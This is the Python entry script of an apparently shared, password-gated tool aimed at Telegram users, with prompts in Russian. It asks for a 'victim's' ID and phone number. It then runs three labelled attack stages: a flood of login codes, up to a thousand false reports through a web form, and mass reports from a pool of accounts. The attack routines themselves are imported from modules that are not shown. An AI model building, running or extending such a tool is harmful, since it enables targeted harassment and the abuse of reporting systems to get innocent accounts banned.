import subprocess
import importlib
import os
import time
import asyncio
from termcolor import colored

from config import API_ID, API_HASH, HASH_PASSWORD, REQUIRED_MODULES, CODE_ATTACK_COUNT
from code_attacker import send_telegram_codes_async
from telethon_reporter import mass_telethon_reports
from web_reporter import mass_web_reports_free
from logger_utils import attack_logger


def check_api_conflict():
    attack_logger.info("Проверка конфликта API: веб-репортер не использует API, конфликта нет.")
    return True # Пока не проработал


os.system("clear")
print("Проверка и установка необходимых модулей...")
time.sleep(2)

for module in REQUIRED_MODULES:
    try:
        importlib.import_module(module)
    except ImportError:
        print(colored(f"Устанавливаю {module}...", "green"))
        subprocess.check_call(["python", "-m", "pip", "install", module])
        os.system("clear")

import aiohttp
import numpy as np
from fake_useragent import UserAgent
from telethon import TelegramClient
from termcolor import colored

os.system("clear")
print(colored("Все модули установлены! Запуск...", "green"))
time.sleep(2)
os.system("clear")


password_input = input(colored("Введите пароль от софта: ", "red"))
if password_input == HASH_PASSWORD:
    print(colored("Загрузка...", "green"))
    time.sleep(1.5)
    os.system("clear")
else:
    print(colored("Не верный пароль!", "red"))
    time.sleep(1)
    os.system("clear")
    exit()


print(colored("============================", "red"))
id_target = input(colored("Введите id жертвы: ", "green")).strip()
phone_target = input(colored("Введите номер телефона жертвы: ", "green")).strip()
number = int(input(colored("Количество веб-жб (<1000): ", "green")).strip())
print(colored("============================\n", "red"))


async def main_attack():
    check_api_conflict()
    
    print(colored("=== ЭТАП 1: Атака кодами ===", "magenta"))
    await send_telegram_codes_async(phone_target, API_ID, API_HASH, count=CODE_ATTACK_COUNT)
    
    print(colored("\n=== ЭТАП 2: Веб-жб ===", "magenta"))
    await mass_web_reports_free(id_target, phone_target, count=number)
    
    print(colored("\n=== ЭТАП 3: Telethon-репорты (пул акков) ===", "magenta"))
    await mass_telethon_reports(id_target, phone_target)
    
    print(colored("\n✅ Атака завершена)", "green"))

if __name__ == "__main__":
    try:
        asyncio.run(main_attack())
    except KeyboardInterrupt:
        print(colored("\n[!] Атака прервана пользователем.", "yellow"))
        attack_logger.info("Атака прервана пользователем")
    except Exception as e:
        print(colored(f"\n[!] Критическая ошибка: {e}", "red"))
        attack_logger.critical(f"Критическая ошибка: {e}")